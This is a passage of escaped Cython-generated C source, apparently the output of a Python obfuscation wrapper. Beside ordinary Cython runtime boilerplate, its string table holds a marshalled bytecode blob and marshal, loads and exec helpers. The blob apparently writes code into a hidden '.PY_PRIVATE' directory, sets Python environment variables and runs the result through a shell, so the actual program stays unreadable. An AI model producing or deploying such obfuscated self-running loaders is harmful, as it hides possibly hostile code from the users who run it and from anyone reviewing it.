NULL;\\n    PyObject* ascii_chars_b = NULL;\\n    const char* default_encoding_c;\\n    sys = PyImport_ImportModule(\\\"sys\\\");\\n    if (!sys) goto bad;\\n    default_encoding = PyObject_CallMethod(sys, (char*) \\\"getdefaultencoding\\\", NULL);\\n    Py_DECREF(sys);\\n    if (!default_encoding) goto bad;\\n    default_encoding_c = PyBytes_AsString(default_encoding);\\n    if (!default_encoding_c) goto bad;\\n    if (strcmp(default_encoding_c, \\\"ascii\\\") == 0) {\\n        __Pyx_sys_getdefaultencoding_not_ascii = 0;\\n    } else {\\n        char ascii_chars[128];\\n        int c;\\n        for (c = 0; c < 128; c++) {\\n            ascii_chars[c] = c;\\n        }\\n        __Pyx_sys_getdefaultencoding_not_ascii = 1;\\n        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);\\n        if (!ascii_chars_u) goto bad;\\n        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);\\n        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {\\n            PyErr_For\"\"mat(\\n                PyExc_ValueError,\\n                \\\"This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.\\\",\\n                default_encoding_c);\\n            goto bad;\\n        }\\n        Py_DECREF(ascii_chars_u);\\n        Py_DECREF(ascii_chars_b);\\n    }\\n    Py_DECREF(default_encoding);\\n    return 0;\\nbad:\\n    Py_XDECREF(default_encoding);\\n    Py_XDECREF(ascii_chars_u);\\n    Py_XDECREF(ascii_chars_b);\\n    return -1;""\\n}\\n#endif\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3\\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)\\n#else\\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\\nstatic char* __PYX_DEFAULT_STRING_ENCODING;\\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\\n    PyObject* sys;\\n    PyObject* default_encoding = NULL;\\n    char* default_encoding_c;\\n    sys = PyImport_ImportModule(\\\"sys\\\");\\n    if (!sys) goto bad;\\n    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) \\\"getdefaultencoding\\\", NULL);\\n    Py_DECREF(sys);\\n    if (!default_encoding) goto bad;\\n    default_encoding_c = PyBytes_AsString(default_encoding);\\n    if (!default_encoding_c) goto bad;\\n    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);\\n    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;\\n    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);\\n    Py_DECREF(default_encoding);\\n    return 0;\\nbad:\\n    Py_XDECREF(default_encoding);\\n    return -1;\\n}\\n#endif\\n#endif\\n\\n\\n/* Test for GCC > 2.95 */\\n#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))\\n  #define likely(x)   __builtin_expect(!!(x), 1)\\n  #define unlikely(x) __builtin_expect(!!(x), 0)\\n#else /* !__GNUC__ or GCC < 2.95 */\\n  #define likely(x)   (x)\\n  #define unlikely\"\"(x) (x)\\n#endif /* __GNUC__ */\\nstatic CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }\\n\\nstatic PyObject *__pyx_m = NULL;\\nstatic PyObject *__pyx_d;\\nstatic PyObject *__pyx_b;\\nstatic PyObject *__pyx_cython_runtime = NULL;\\nstatic PyObject *__pyx_empty_tuple;\\nstatic PyObject *__pyx_empty_bytes;\\nstatic PyObject *__pyx_empty_unicode;\\nstatic int __pyx_lineno;\\nstatic int __pyx_clineno = 0;\\nstati""c const char * __pyx_cfilenm= __FILE__;\\nstatic const char *__pyx_filename;\\n\\n\\nstatic const char *__pyx_f[] = {\\n  \\\"source.py\\\",\\n};\\n\\n/*--- Type declarations ---*/\\n\\n/* --- Runtime support code (head) --- */\\n/* Refnanny.proto */\\n#ifndef CYTHON_REFNANNY\\n  #define CYTHON_REFNANNY 0\\n#endif\\n#if CYTHON_REFNANNY\\n  typedef struct {\\n    void (*INCREF)(void*, PyObject*, int);\\n    void (*DECREF)(void*, PyObject*, int);\\n    void (*GOTREF)(void*, PyObject*, int);\\n    void (*GIVEREF)(void*, PyObject*, int);\\n    void* (*SetupContext)(const char*, int, const char*);\\n    void (*FinishContext)(void**);\\n  } __Pyx_RefNannyAPIStruct;\\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;\\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);\\n  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;\\n#ifdef WITH_THREAD\\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\\\\n          if (acquire_gil) {\\\\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\\\\\\n              PyGILState_Release(__pyx_gilstate_save);\\\\\\n          } else {\\\\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\\\\\\n          }\\n#else\\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\\\\n          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)\\n#endif\\n  #define __Pyx_RefNannyFinishContext()\\\\\\n          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)\"\"\\n  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\\n  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\\n  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\\n  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObje""ct *)(r), __LINE__)\\n  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)\\n  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)\\n  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)\\n  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)\\n#else\\n  #define __Pyx_RefNannyDeclarations\\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\n  #define __Pyx_RefNannyFinishContext()\\n  #define __Pyx_INCREF(r) Py_INCREF(r)\\n  #define __Pyx_DECREF(r) Py_DECREF(r)\\n  #define __Pyx_GOTREF(r)\\n  #define __Pyx_GIVEREF(r)\\n  #define __Pyx_XINCREF(r) Py_XINCREF(r)\\n  #define __Pyx_XDECREF(r) Py_XDECREF(r)\\n  #define __Pyx_XGOTREF(r)\\n  #define __Pyx_XGIVEREF(r)\\n#endif\\n#define __Pyx_XDECREF_SET(r, v) do {\\\\\\n        PyObject *tmp = (PyObject *) r;\\\\\\n        r = v; __Pyx_XDECREF(tmp);\\\\\\n    } while (0)\\n#define __Pyx_DECREF_SET(r, v) do {\\\\\\n        PyObject *tmp = (PyObject *) r;\\\\\\n        r = v; __Pyx_DECREF(tmp);\\\\\\n    } while (0)\\n#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)\\n#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)\\n\\n/* PyObjectGetAttrStr.proto */\\n#if CYTHON_USE_TYPE_SLOTS\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);\\n#else\\n#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)\\n#endif\\n\\n/* GetBuiltinName.proto */\\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name);\\n\\n/* Import.proto */\\nstatic PyObject *__Pyx_Import(P\"\"yObject *name, PyObject *from_list, int level);\\n\\n/* PyDictVersioning.proto */\\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\\n#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)\\n#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)\\n#define __PYX_UPDATE_DICT_""CACHE(dict, value, cache_var, version_var)\\\\\\n    (version_var) = __PYX_GET_DICT_VERSION(dict);\\\\\\n    (cache_var) = (value);\\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\\\\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\\\\n    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\\\\\\n        (VAR) = __pyx_dict_cached_value;\\\\\\n    } else {\\\\\\n        (VAR) = __pyx_dict_cached_value = (LOOKUP);\\\\\\n        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\\\\\\n    }\\\\\\n}\\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);\\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);\\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);\\n#else\\n#define __PYX_GET_DICT_VERSION(dict)  (0)\\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);\\n#endif\\n\\n/* GetModuleGlobalName.proto */\\n#if CYTHON_USE_DICT_VERSIONS\\n#define __Pyx_GetModuleGlobalName(var, name)  do {\\\\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\\\\n    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\\\\\\n        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\\\\\\n        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\\\\n} while(0)\\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\\\\\\n    PY_UINT64_T __pyx_dict_version;\\\\\\n    PyObject *__py\"\"x_dict_cached_value;\\\\\\n    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\\\\n} while(0)\\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_vers""ion, PyObject **dict_cached_value);\\n#else\\n#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);\\n#endif\\n\\n/* PyObjectCall.proto */\\n#if CYTHON_COMPILING_IN_CPYTHON\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);\\n#else\\n#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)\\n#endif\\n\\n/* GetItemInt.proto */\\n#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\\\\\\n    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\\\\\\n    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\\\\\\n    (is_list ? (PyErr_SetString(PyExc_IndexError, \\\"list index out of range\\\"), (PyObject*)NULL) :\\\\\\n               __Pyx_GetItemInt_Generic(o, to_py_func(i))))\\n#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\\\\\\n    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\\\\\\n    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\\\\\\n    (PyErr_SetString(PyExc_IndexError, \\\"list index out of range\\\"), (PyObject*)NULL))\\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,\\n                                                              int wraparound, int boundscheck);\\n#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\\\\\\n    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\\\\\\n    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\\\\\\n    (PyErr_SetString(PyExc_IndexError, \\\"tuple index out of range\"\"\\\"), (PyObject*)NULL))\\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,\\n                                      ""                        int wraparound, int boundscheck);\\nstatic PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);\\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,\\n                                                     int is_list, int wraparound, int boundscheck);\\n\\n/* SliceObject.proto */\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(\\n        PyObject* obj, Py_ssize_t cstart, Py_ssize_t cstop,\\n        PyObject** py_start, PyObject** py_stop, PyObject** py_slice,\\n        int has_cstart, int has_cstop, int wraparound);\\n\\n/* IncludeStringH.proto */\\n#include <string.h>\\n\\n/* BytesEquals.proto */\\nstatic CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals);\\n\\n/* UnicodeEquals.proto */\\nstatic CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals);\\n\\n/* PyCFunctionFastCall.proto */\\n#if CYTHON_FAST_PYCCALL\\nstatic CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);\\n#else\\n#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)\\n#endif\\n\\n/* PyFunctionFastCall.proto */\\n#if CYTHON_FAST_PYCALL\\n#define __Pyx_PyFunction_FastCall(func, args, nargs)\\\\\\n    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)\\n#if 1 || PY_VERSION_HEX < 0x030600B1\\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);\\n#else\\n#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)\\n#endif\\n#define __Pyx_BUILD_ASSERT_EXPR(cond)\\\\\\n    (sizeof(char [1 - 2*!(cond)]) - 1)\\n#ifndef Py_MEMBER_SIZE\\n#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)\\n#endif\\n#if CYTHON_FAST_PYCALL\\n  static size_t __pyx_pyframe_localsplus_offset = \"\"0;\\n  #include \\\"frameobject.h\\\"\\n#if PY_VERSION_HEX >= 0x030b00a6\\n  #ifndef Py_BUILD_CORE""\\n    #define Py_BUILD_CORE 1\\n  #endif\\n  #include \\\"internal/pycore_frame.h\\\"\\n#endif\\n  #define __Pxy_PyFrame_Initialize_Offsets()\\\\\\n    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\\\\\\n     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))\\n  #define __Pyx_PyFrame_GetLocalsplus(frame)\\\\\\n    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))\\n#endif // CYTHON_FAST_PYCALL\\n#endif\\n\\n/* PyObjectCallMethO.proto */\\n#if CYTHON_COMPILING_IN_CPYTHON\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);\\n#endif\\n\\n/* PyObjectCallOneArg.proto */\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);\\n\\n/* GetAttr.proto */\\nstatic CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *, PyObject *);\\n\\n/* Globals.proto */\\nstatic PyObject* __Pyx_Globals(void);\\n\\n/* PyExec.proto */\\nstatic PyObject* __Pyx_PyExec3(PyObject*, PyObject*, PyObject*);\\nstatic CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject*, PyObject*);\\n\\n/* PyExecGlobals.proto */\\nstatic PyObject* __Pyx_PyExecGlobals(PyObject*);\\n\\n/* PyThreadStateGet.proto */\\n#if CYTHON_FAST_THREAD_STATE\\n#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;\\n#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;\\n#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type\\n#else\\n#define __Pyx_PyThreadState_declare\\n#define __Pyx_PyThreadState_assign\\n#define __Pyx_PyErr_Occurred()  PyErr_Occurred()\\n#endif\\n\\n/* PyErrFetchRestore.proto */\\n#if CYTHON_FAST_THREAD_STATE\\n#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)\\n#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(Py\"\"ThreadState_GET(), type, valu""e, tb)\\n#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)\\n#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)\\n#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)\\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);\\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\\n#if CYTHON_COMPILING_IN_CPYTHON\\n#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))\\n#else\\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\\n#endif\\n#else\\n#define __Pyx_PyErr_Clear() PyErr_Clear()\\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\\n#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)\\n#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)\\n#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)\\n#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)\\n#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)\\n#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)\\n#endif\\n\\n/* CLineInTraceback.proto */\\n#ifdef CYTHON_CLINE_IN_TRACEBACK\\n#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)\\n#else\\nstatic int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);\\n#endif\\n\\n/* CodeObjectCache.proto */\\ntypedef struct {\\n    PyCodeObject* code_object;\\n    int code_line;\\n} __Pyx_CodeObjectCacheEntry;\\nstruct __Pyx_CodeObjectCache {\\n    int count;\\n    int max_count;\\n    __Pyx_CodeObjectCacheEntry* entries;\\n};\\nstatic struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};\\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObj""ectCacheEnt\"\"ry* entries, int count, int code_line);\\nstatic PyCodeObject *__pyx_find_code_object(int code_line);\\nstatic void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);\\n\\n/* AddTraceback.proto */\\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\\n                               int py_line, const char *filename);\\n\\n/* GCCDiagnostics.proto */\\n#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))\\n#define __Pyx_HAS_GCC_DIAGNOSTIC\\n#endif\\n\\n/* CIntToPy.proto */\\nstatic CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);\\n\\n/* CIntFromPy.proto */\\nstatic CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);\\n\\n/* CIntFromPy.proto */\\nstatic CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);\\n\\n/* FastTypeChecks.proto */\\n#if CYTHON_COMPILING_IN_CPYTHON\\n#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)\\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);\\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);\\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);\\n#else\\n#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)\\n#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)\\n#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))\\n#endif\\n#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)\\n\\n/* CheckBinaryVersion.proto */\\nstatic int __Pyx_check_binary_version(void);\\n\\n/* InitStrings.proto */\\nstatic int __Pyx_InitStrings(__Pyx_StringTabEntry *t);\\n\\n\\n/* Module declarations from 'source' */\\n#define __Pyx_MODULE_NAME \\\"source\\\"\\nextern int __pyx_module_is_main_source;\\nint __pyx_module_is_main_source = 0;\\n""\\n/* Implementation of 'source' */\\nstatic PyObject *__pyx_builtin_pr\"\"int;\\nstatic PyObject *__pyx_builtin_exit;\\nstatic const char __pyx_k_[] = \\\".\\\";\\nstatic const char __pyx_k__2[] = \\\" \\\";\\nstatic const char __pyx_k_3_9[] = \\\"3.9\\\";\\nstatic const char __pyx_k_sys[] = \\\"sys\\\";\\nstatic const char __pyx_k_exit[] = \\\"exit\\\";\\nstatic const char __pyx_k_main[] = \\\"__main__\\\";\\nstatic const char __pyx_k_name[] = \\\"__name__\\\";\\nstatic const char __pyx_k_test[] = \\\"__test__\\\";\\nstatic const char __pyx_k_loads[] = \\\"loads\\\";\\nstatic const char __pyx_k_print[] = \\\"print\\\";\\nstatic const char __pyx_k_split[] = \\\"split\\\";\\nstatic const char __pyx_k_import[] = \\\"__import__\\\";\\nstatic const char __pyx_k_VERSION[] = \\\"[VERSION]\\\";\\nstatic const char __pyx_k_marshal[] = \\\"marshal\\\";\\nstatic const char __pyx_k_version[] = \\\"version\\\";\\nstatic const char __pyx_k_builtins[] = \\\"__builtins__\\\";\\nstatic const char __pyx_k_PYTHON_VERSION[] = \\\"PYTHON_VERSION\\\";\\nstatic const char __pyx_k_cline_in_traceback[] = \\\"cline_in_traceback\\\";\\nstatic const char __pyx_k_No_support_for_VALUE[] = \\\"[!] No support for [VALUE]\\\";\\nstatic const char __pyx_k_c_sL_d_Z_e_r_d_d_Z_d_d_l_Z_d_d_l[] = \\\"c\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\010\\\\000\\\\000\\\\000@\\\\000\\\\000\\\\000sL\\\\001\\\\000\\\\000d\\\\000Z\\\\000e\\\\000r\\\\020d\\\\001d\\\\002\\\\204!Z\\\\001d\\\\002d\\\\003l\\\\002Z\\\\002d\\\\002d\\\\003l\\\\003Z\\\\003d\\\\004Z\\\\004d\\\\005Z\\\\005e\\\\003j\\\\006Z\\\\007d\\\\006e\\\\007\\\\027\\\\000Z\\\\010d\\\\007e\\\\003j\\\\t\\\\027\\\\000Z\\\\nd\\\\010e\\\\005\\\\027\\\\000Z\\\\013e\\\\002j\\\\014\\\\240\\\\re\\\\005\\\\241\\\\001rve\\\\002\\\\240\\\\016e\\\\010d\\\\t\\\\027\\\\000e\\\\n\\\\027\\\\000d\\\\t\\\\027\\\\000e\\\\013\\\\027\\\\000\\\\241\\\\001\\\\001\\\\000e\\\\017d\\\\002\\\\203\\\\001""\\\\001\\\\000d\\\\nZ\\\\020d\\\\013Z\\\\021d\\\\014\\\\240\\\\022e\\\\003j\\\\023\\\\240\\\\024d\\\\r\\\\241\\\\001d\\\\002\\\\031\\\\000\\\\240\\\\024d\\\\014\\\\241\\\\001d\\\\003d\\\\016\\\\205\\\\002\\\\031\\\\000\\\\241\\\\001Z\\\\025d\\\\017e\\\\007\\\\027\\\\000d\\\\020\\\\027\\\\000e\\\\025\\\\027\\\\000d\\\\021\\\\027\\\\000e\\\\005\\\\027\\\\000d\\\\r\\\\027\\\\000e\\\\021\\\\027\\\\000d\\\\022\\\\027\\\\000e\\\\007\\\\027\\\\000d\\\\023\\\\027\\\\000e\\\\025\\\\027\\\\000Z\\\\026e\\\\027e\"\"\\\\021d\\\\024\\\\203\\\\002\\\\217\\\\032Z\\\\030e\\\\030\\\\240\\\\031e\\\\020\\\\241\\\\001\\\\001\\\\000W\\\\000d\\\\003\\\\004\\\\000\\\\004\\\\000\\\\203\\\\003\\\\001\\\\000n\\\\0201\\\\000s\\\\3740\\\\000\\\\001\\\\000\\\\001\\\\000\\\\001\\\\000Y\\\\000\\\\001\\\\000e\\\\002j\\\\032e\\\\002j\\\\014\\\\240\\\\033e\\\\005\\\\241\\\\001d\\\\025d\\\\026\\\\215\\\\002\\\\001\\\\000e\\\\002\\\\240\\\\016e\\\\010d\\\\t\\\\027\\\\000e\\\\n\\\\027\\\\000d\\\\t\\\\027\\\\000e\\\\026\\\\027\\\\000d\\\\t\\\\027\\\\000e\\\\013\\\\027\\\\000\\\\241\\\\001\\\\001\\\\000e\\\\002\\\\240\\\\034e\\\\021\\\\241\\\\001\\\\001\\\\000d\\\\003S\\\\000)\\\\027F\\\\351\\\\001\\\\000\\\\000\\\\000\\\\351\\\\000\\\\000\\\\000\\\\000Nu\\\\t\\\\000\\\\000\\\\000\\\\330\\\\250\\\\330\\\\256 \\\\360\\\\237\\\\221\\\\200z\\\\035.PY_PRIVATE/20240909130845922z\\\\022export PYTHONHOME=z\\\\031export PYTHON_EXECUTABLE=z\\\\002./z\\\\004 && av\\\\343\\\\003\\\\000#ifndef PY_SSIZE_T_CLEAN\\\\n#define PY_SSIZE_T_CLEAN\\\\n#endif /* PY_SSIZE_T_CLEAN */\\\\n#include \\\\\\\"Python.h\\\\\\\"\\\\n#ifndef Py_PYTHON_H\\\\n    #error Python headers needed to compile C extensions, please install development version of Python.\\\\n#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)\\\\n    #error Cython requires Python 2.6+ or Python 3.3+.\\\\n#else\\\\n#define CYTHON_ABI \\\\\\\"0_29_33\\\\\\\"\\\\n#define CYTHON_HEX_VERSION 0x001D21F0\\\\n#define CYTHON_FUT""URE_DIVISION 1\\\\n#include <stddef.h>\\\\n#ifndef offsetof\\\\n  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )\\\\n#endif\\\\n#if !defined(WIN32) && !defined(MS_WINDOWS)\\\\n  #ifndef __stdcall\\\\n    #de\\\"\\\"fine __stdcall\\\\n  #endif\\\\n  #ifndef __cdecl\\\\n    #define __cdecl\\\\n  #endif\\\\n  #ifndef __fastcall\\\\n    #define __fastcall\\\\n  #endif\\\\n#endif\\\\n#ifndef DL_IMPORT\\\\n  #define DL_IMPORT(t) t\\\\n#endif\\\\n#ifndef DL_EXPORT\\\\n  #define DL_EXPORT(t) t\\\\n#endif\\\\n#define __PYX_COMMA ,\\\\n#ifndef HAVE_LONG_LONG\\\\n  #if PY_VERSION_HEX >= 0x02070000\\\\n    #define HAVE_LONG_LONG\\\\n  #endif\\\\n#endif\\\\n#ifndef PY_LONG_LONG\\\\n  #define PY_LONG_LONG LONG_LONG\\\\n#endif\\\\n#ifndef Py_HUGE_VAL\\\\n  #define Py_HUGE_VAL HUGE_VAL\\\\n#endif\\\\n#ifdef PYPY_VERSION\\\\n  #define CYTHON_COMP\"\"ILING_IN_PYPY 1\\\\n  #define CYTHON_COMPILING_IN_PYSTON 0\\\\n  #define CYTHON_COMPILING_IN_CPYTHON 0\\\\n  #define CYTHON_COMPILING_IN_NOGIL 0\\\\n  #undef CYTHON_USE_TYPE_SLOTS\\\\n  #define CYTHON_USE_TYPE_SLOTS 0\\\\n  #undef CYTHON_USE_PYTYPE_LOOKUP\\\\n  #define 